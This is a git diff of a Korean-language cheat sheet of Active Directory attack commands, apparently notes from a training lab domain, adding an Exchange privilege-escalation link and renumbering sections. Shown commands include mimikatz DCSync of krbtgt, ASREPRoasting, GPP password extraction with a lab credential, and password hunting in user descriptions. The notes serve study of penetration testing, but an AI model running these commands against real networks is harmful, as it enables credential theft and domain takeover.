@@ -777,7 +777,11 @@ mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
 <br/><br/>
 # 기타 잘못된 구성
 
-## 1. Printer Bug
+## 1. Exchange-AD-Privesc
+- 참고 : https://github.com/gdedrouas/Exchange-AD-Privesc?tab=readme-ov-file
+
+<br/><br/>
+## 2. Printer Bug
 
 ### MS-PRN Printer Bug 열거
 ```
@@ -786,7 +790,7 @@ Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 ```
 
 <br/><br/>
-## 2. DNS 레코드 열거
+## 3. DNS 레코드 열거
 
 ### adidnsdump 사용
 ```adidnsdump -u inlanefreight\\forend ldap://172.16.5.5```
@@ -798,7 +802,7 @@ Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 ```head records.csv```
 
 <br/><br/>
-## 3. 기타
+## 4. 기타
 
 ### Get-Domain User를 사용하여 Description 필드에서 비밀번호 찾기
 ```Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}```
@@ -810,7 +814,7 @@ Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 ```ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts```
 
 <br/><br/>
-## 4. Group Policy Preferences (GPP) Passwords
+## 5. Group Policy Preferences (GPP) Passwords
 
 ###  SYSVOL 공유에 Groups.xml 보기
 
@@ -824,7 +828,7 @@ Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 ```crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin```
 
 <br/><br/>
-## 5. ASREPRoasting
+## 6. ASREPRoasting
 
 ### Get-DomainUser를 사용하여 DONT_REQ_PREAUTH 값 열거
 ```Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl```
@@ -842,7 +846,7 @@ Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 ```GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users```
 
 <br/><br/>
-## 6. Group Policy Object (GPO) Abuse
+## 7. Group Policy Object (GPO) Abuse
 
 ### PowerView를 사용하여 GPO 이름 열거
 ```Get-DomainGPO |select displayname```
